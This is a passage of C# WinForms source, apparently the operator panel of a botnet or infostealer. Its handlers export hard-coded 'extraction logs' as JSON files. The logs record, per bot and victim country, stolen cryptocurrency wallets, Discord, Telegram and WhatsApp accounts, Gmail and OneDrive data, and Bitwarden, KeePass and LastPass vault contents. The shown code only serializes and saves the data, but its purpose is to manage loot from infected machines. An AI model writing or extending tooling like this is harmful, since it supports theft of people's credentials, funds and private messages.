            type = "crypto_extraction_logs",
            logs = new object[]
            {
                new { bot = "bot_004", country = "JP", wallet = "Bitcoin", amount = "0.5 BTC", address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" },
                new { bot = "bot_006", country = "CA", wallet = "Ethereum", amount = "2.3 ETH", address = "0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6" },
                new { bot = "bot_001", country = "US", wallet = "MetaMask", accounts = 12, networks = new[] { "Ethereum", "Polygon", "BSC" } }
            }
        };

        ExportLogs(exportData, "crypto-extraction-logs.json");
    }

    private void ExportMessagingLogs_Click(object? sender, EventArgs e)
    {
        var exportData = new
        {
            timestamp = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
            type = "messaging_extraction_logs",
            logs = new object[]
            {
                new { bot = "bot_001", country = "US", platform = "Discord", accounts = 3, servers = 45 },
                new { bot = "bot_002", country = "UK", platform = "Telegram", chats = 2, contacts = 156 },
                new { bot = "bot_008", country = "BR", platform = "WhatsApp", status = "extraction_in_progress" }
            }
        };

        ExportLogs(exportData, "messaging-extraction-logs.json");
    }

    private void ExportCloudLogs_Click(object? sender, EventArgs e)
    {
        var exportData = new
        {
            timestamp = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
            type = "cloud_extraction_logs",
            logs = new object[]
            {
                new { bot = "bot_001", country = "US", service = "Gmail", accounts = 2, emails = 1250 },
                new { bot = "bot_003", country = "DE", service = "OneDrive", files = 156, size = "2.3 GB" },
                new { bot = "bot_006", country = "CA", service = "Outlook", accounts = 1, emails = 890 }
            }
        };

        ExportLogs(exportData, "cloud-extraction-logs.json");
    }

    private void ExportPasswordLogs_Click(object? sender, EventArgs e)
    {
        var exportData = new
        {
            timestamp = DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
            type = "password_extraction_logs",
            logs = new object[]
            {
                new { bot = "bot_004", country = "JP", manager = "Bitwarden", passwords = 89, folders = 12 },
                new { bot = "bot_006", country = "CA", manager = "KeePass", entries = 45, groups = 8 },
                new { bot = "bot_001", country = "US", manager = "LastPass", passwords = 67, sites = 89 }
            }
        };

        ExportLogs(exportData, "password-extraction-logs.json");
    }

    private void ExportLogs(object data, string filename)
    {
        try
        {
            var json = System.Text.Json.JsonSerializer.Serialize(data, new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
            var saveDialog = new SaveFileDialog
            {
                FileName = filename,
                Filter = "JSON files (*.json)|*.json|All files (*.*)|*.*",
                Title = "Export Extraction Logs"
            };

            if (saveDialog.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(saveDialog.FileName, json);
                MessageBox.Show($"Logs exported successfully to {saveDialog.FileName}!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show($"Failed to export logs: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}
